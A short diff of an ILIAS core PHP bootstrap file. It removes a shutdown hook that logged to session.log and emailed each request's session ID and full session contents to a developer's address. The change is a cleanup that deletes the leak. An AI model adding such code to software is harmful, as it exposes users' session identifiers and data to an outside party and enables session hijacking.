@@ -32,13 +32,6 @@
 * @package ilias-core
 */
 
-$GLOBALS['working_dir'] = getcwd();
-register_shutdown_function(
-	create_function('','
-		error_log("=========================\n", 3, $GLOBALS["working_dir"]."/session.log");
-		mail("bheyser@databay.de", session_id(), print_r($_SESSION,1));
-	')
-);
 
 $GLOBALS['ilGlobalStartTime'] = microtime();
 require_once("Services/Init/classes/class.ilInitialisation.php");
